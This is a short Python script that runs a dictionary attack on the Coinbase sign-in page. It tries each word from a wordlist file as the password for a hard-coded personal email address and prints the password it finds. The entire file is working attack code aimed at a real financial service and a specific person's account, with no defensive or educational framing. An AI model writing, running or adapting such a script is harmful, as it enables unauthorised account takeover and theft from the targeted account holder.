#!/usr/bin/env python

import requests

# import the target url and method
target_url = "https://www.coinbase.com/signin"
data_dict = {"email": "192mitch88@gmail.com", "password": "", "commit": "submit"}

# response.content
denied = "Invalid email or password.  Try clicking &#39;Forgot Password&#39; if you&#39;re having trouble signing in."


# open the wordlist file and iterate through each word, stripping the words of whitespace chars
# once the password is found, it will be displayed and the program will terminate
with open("dic-0294.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if denied not in response.content:
            print("[+] Found the password --> " + word)
            exit()

# If the program gets this far, it has not found the password in the wordlist
print("[+] Reached end of line. Try another wordlist")